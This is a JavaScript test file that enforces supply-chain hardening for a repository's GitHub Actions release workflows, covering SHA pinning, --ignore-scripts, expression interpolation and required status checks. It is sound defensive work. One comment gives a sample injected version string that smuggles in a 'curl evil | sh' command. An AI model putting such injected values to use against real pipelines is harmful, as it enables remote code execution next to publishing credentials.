// Supply-chain regressions in .github/workflows, not style nits. Each block
// below re-closes a specific hole a security review found in the release path,
// so that closing it once is not undone by the next person editing a workflow.
//
// The release path is unusual in this repo: publish.yml runs with
// `contents: write` and `id-token: write`, and the OIDC token it mints is a
// credential that can publish @victortomaili/agent-cli to npm. Anything that
// executes inside that job executes next to that credential.
//
//   pinning         a `uses:` on a moving tag (`@v4`) is a standing grant of
//                   code execution to whoever can move the tag. Pinned by
//                   commit SHA it is a fixed artifact.
//   install scripts `npm ci` runs dependency lifecycle scripts by default, so
//                   a transitive postinstall would run beside the publish
//                   credential. --ignore-scripts is only safe while nothing in
//                   the tree needs them, which is asserted here.
//   expressions     a `${{ }}` inside `run:` is substituted into the script
//                   TEXT before bash parses it, so the value becomes code.
//   check names     main's required contexts are a hand transcription of a
//                   workflow matrix; see scripts/workflow-checks.js.

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import yaml from "yaml";
import {
	WORKFLOW_DIR,
	deriveCheckNames,
	readManifest,
	reconcile,
} from "../scripts/workflow-checks.js";

const ROOT = fileURLToPath(new URL("..", import.meta.url));

const workflowFiles = fs
	.readdirSync(WORKFLOW_DIR)
	.filter((f) => /\.ya?ml$/.test(f))
	.sort();

const workflows = workflowFiles.map((file) => ({
	file,
	text: fs.readFileSync(path.join(WORKFLOW_DIR, file), "utf8"),
	doc: yaml.parse(fs.readFileSync(path.join(WORKFLOW_DIR, file), "utf8")),
}));

/** Every `run:` script in a workflow, as `{ file, job, step, run }`. */
function runSteps() {
	const out = [];
	for (const { file, doc } of workflows) {
		for (const [jobId, job] of Object.entries(doc?.jobs ?? {})) {
			for (const [index, step] of (job?.steps ?? []).entries()) {
				if (typeof step?.run === "string") {
					out.push({
						file,
						job: jobId,
						step: step.name ?? `step ${index}`,
						run: step.run,
					});
				}
			}
		}
	}
	return out;
}

test("every action is pinned to a full commit SHA with its version in a comment", () => {
	// A tag is a mutable pointer: `actions/checkout@v7` is whatever v7 points
	// at when the job starts, and re-pointing it is a repo-side operation that
	// leaves no trace in this repository. A 40-hex commit SHA names an
	// immutable object. The trailing `# vX.Y.Z` is what keeps the pin legible
	// and lets a bot (or a human) tell how far behind it is.
	const USES = /^\s*(?:-\s*)?uses:\s*(\S+)\s*(#.*)?$/;
	const problems = [];

	for (const { file, text } of workflows) {
		for (const [lineNo, line] of text.split("\n").entries()) {
			const match = USES.exec(line);
			if (!match) continue;
			const [, spec, comment] = match;
			const where = `${file}:${lineNo + 1}`;

			// A local composite action or a container image is not a tag that
			// someone else can move, so neither needs a SHA.
			if (spec.startsWith("./") || spec.startsWith("docker://")) continue;

			const ref = spec.split("@")[1];
			if (!ref || !/^[0-9a-f]{40}$/.test(ref)) {
				problems.push(`${where}: ${spec} is not pinned to a 40-hex commit SHA`);
				continue;
			}
			if (!comment || !/#\s*v\d+\.\d+\.\d+/.test(comment)) {
				problems.push(
					`${where}: ${spec} is pinned but has no trailing "# vX.Y.Z" version comment`,
				);
			}
		}
	}

	assert.deepEqual(problems, [], `unpinned actions:\n${problems.join("\n")}`);
});

test("no dependency in the lockfile declares an install script", () => {
	// This is the assertion that makes `npm ci --ignore-scripts` safe rather
	// than merely quiet. The flag skips lifecycle scripts; if a dependency
	// genuinely needed one, skipping it would produce a half-installed tree
	// whose failure surfaced somewhere unrelated. Asserting the tree has none
	// turns that into a failure here, at the point where the reason is written
	// down. If this ever fires: the dependency needs a real decision, not a
	// deleted flag — the publish job holds an npm publish credential while it
	// installs.
	const lock = JSON.parse(
		fs.readFileSync(path.join(ROOT, "package-lock.json"), "utf8"),
	);
	const withScripts = Object.entries(lock.packages ?? {})
		.filter(([, meta]) => meta?.hasInstallScript)
		.map(([name]) => name || "(root)");

	assert.deepEqual(
		withScripts,
		[],
		`these packages run install scripts, so --ignore-scripts changes behaviour: ${withScripts.join(", ")}`,
	);
});

test("every `npm ci` in a workflow passes --ignore-scripts", () => {
	const problems = [];
	for (const { file, job, step, run } of runSteps()) {
		for (const line of run.split("\n")) {
			if (!/\bnpm\s+ci\b/.test(line)) continue;
			if (!/--ignore-scripts\b/.test(line)) {
				problems.push(`${file} (job ${job}, ${step}): ${line.trim()}`);
			}
		}
	}
	assert.deepEqual(
		problems,
		[],
		`npm ci without --ignore-scripts:\n${problems.join("\n")}`,
	);
});

test("no `run:` script interpolates a ${{ }} expression", () => {
	// GitHub substitutes `${{ }}` into the script body before the shell sees
	// it, so the value is not an argument — it is source code. A version string
	// of `1.0.0"; curl evil | sh; #` becomes a second command. Values reach a
	// script safely through `env:`, where the shell reads them as data no
	// matter what they contain.
	//
	// There is deliberately no opt-out marker here. Nothing in the tree needs
	// one, and an escape hatch built before anything is asking for it is just a
	// pre-approved exception. Whoever first has a real case can add one in the
	// same change that needs it, with the reason attached.
	const problems = [];
	for (const { file, job, step, run } of runSteps()) {
		if (/\$\{\{/.test(run)) {
			const line = run
				.split("\n")
				.find((l) => l.includes("${{"))
				?.trim();
			problems.push(`${file} (job ${job}, ${step}): ${line}`);
		}
	}
	assert.deepEqual(
		problems,
		[],
		`expression interpolated into a shell script — pass it via env: instead:\n${problems.join("\n")}`,
	);
});

test("required-status-checks.json classifies exactly the checks the workflows produce", () => {
	// Both directions matter, and they fail differently:
	//   phantom      a required context no job produces never reports, so main
	//                becomes unmergeable by everyone until an admin intervenes.
	//                This has happened here before.
	//   unclassified a real check nothing requires can fail while the PR still
	//                merges — the failure mode you do not notice.
	const { phantom, unclassified } = reconcile();

	assert.deepEqual(
		phantom,
		[],
		`required-status-checks.json names checks no workflow job produces. Requiring one of these makes main unmergeable:\n  ${phantom.join("\n  ")}`,
	);
	assert.deepEqual(
		unclassified,
		[],
		`these checks exist but the manifest does not mention them. Add each to "required", or to "not_required" with the reason:\n  ${unclassified.join("\n  ")}`,
	);
});

test("every not_required check carries a written reason", () => {
	// The reason is the load-bearing part. `Analyze (actions)` looks like an
	// oversight to anyone who has not been told it is a decision, and "fixing"
	// it means adding a required context — which is the outage. A sentence in
	// the manifest is what stops that.
	const manifest = readManifest();
	const thin = Object.entries(manifest.not_required ?? {})
		.filter(([, reason]) => typeof reason !== "string" || reason.trim().length < 40)
		.map(([name]) => name);

	assert.deepEqual(
		thin,
		[],
		`these entries need a real explanation of why they are not required: ${thin.join(", ")}`,
	);
});

test("the CodeQL context the severity policy names is actually required", () => {
	// scripts/codeql/severity-policy.json declares which CodeQL context
	// enforces the block/advisory split. If that context is not in the required
	// list, the policy documents an enforcement mechanism that is not running.
	const policy = JSON.parse(
		fs.readFileSync(
			path.join(ROOT, "scripts", "codeql", "severity-policy.json"),
			"utf8",
		),
	);
	const declared = policy?.policy_metadata?.branch_protection_context;
	assert.ok(declared, "severity-policy.json declares no branch_protection_context");

	const manifest = readManifest();
	assert.ok(
		(manifest.required ?? []).includes(declared),
		`severity-policy.json says "${declared}" enforces the CodeQL policy, but required-status-checks.json does not require it`,
	);

	assert.ok(
		deriveCheckNames().some((c) => c.name === declared),
		`severity-policy.json names "${declared}", which no workflow job produces`,
	);
});
